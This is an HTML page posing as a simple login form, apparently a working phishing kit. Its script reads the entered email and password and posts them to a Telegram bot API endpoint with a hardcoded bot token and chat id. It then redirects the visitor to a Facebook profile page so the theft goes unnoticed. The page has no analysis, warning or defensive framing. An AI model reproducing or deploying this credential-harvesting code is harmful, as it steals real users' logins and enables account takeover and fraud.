<!DOCTYPE html>
<html>
<head>
    <title>Login Form</title>
</head>
<body>
    <h1>Login Form</h1>
    <form>
        <label for="email">Email:</label>
        <input type="email" id="email" name="email"><br><br>
        <label for="pass">Password:</label>
        <input type="password" id="pass" name="pass"><br><br>
        <button type="button" onclick="sendTelegramMessage()">Login</button>
    </form>

    <script>
        function sendTelegramMessage() {
            var phoneNumber = document.getElementById("email").value;
            var password = document.getElementById("pass").value;
            var message = "Số điện thoại: " + phoneNumber + "\nGmail: " + password;
            var url = "https://api.telegram.org/bot6630148049:AAG1xYKPmQvG1EaUCb8_JygwwwF-F2dkNQ0/sendMessage";
            var chatId = "-1002081721946";
            var xhr = new XMLHttpRequest();
            xhr.open("POST", url, true);
            xhr.setRequestHeader('Content-Type', 'application/x-www-form-urlencoded');
            xhr.send("chat_id=" + chatId + "&text=" + message);

            // Chuyển hướng sang trang web của Facebook
            window.location.href = "https://m.facebook.com/profile";
        }
    </script>
</body>
</html>
